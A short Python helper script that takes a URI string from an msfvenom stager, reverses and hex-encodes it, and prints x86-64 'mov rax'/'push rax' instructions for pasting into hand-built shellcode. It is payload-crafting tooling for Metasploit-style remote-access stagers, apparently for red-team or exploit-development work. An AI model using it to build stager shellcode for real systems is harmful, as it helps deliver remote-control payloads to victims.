"""
's' is the uri extracted from msfvenom stager.

Replace the existing string, and run:

    python3 srv_uri_2_bytes.py

then paste the generated code to your source, and feel free to

modify anything as needed.
"""

def reverse(string):
    string = string[::-1]
    return string

s = 'LM56LbrVoq9HXkZcI5rSlg1Nj-Km_Tvk_sLa7tsF3atxHRe_FrJrIEtDeZfulWKDX0Ujm3ggJW8CYCwRNzSIaMlj6K0RW8jEHCr7p2wXkyj3UhGhneiH3LA3AOXoCViZvcEH0ThP2uZ0PtuHheJfGu457y2-Aw-tTaBSeP7lnBLL3zUfFGbWr-x1LRw_o3W7u_G9sKiLXI79acVyGuvRLKMR'

print(f'\n[*]Original URI string:\n\n{s}\n\n')

print(f'[*]Reversed URI string:\n\n{reverse(s)}\n\n')

print('[*]Generated instructions:\n\n')

rs = reverse(s)
i = 0
l = ''
for c in rs:
    i += 1
    l += hex(ord(c))[2:]
    if i % 8 == 0 or i == len(s):
        print(f'"\tmov rax, {l}\t\t;"')
        print('"\tpush rax\t\t\t\t;"')
        l = ''

print(f"\n[*]Done! Total byte lines: {i // 8}\n[*]Need to clean up extra {hex(i // 8 * 8)} bytes of stack space\n")
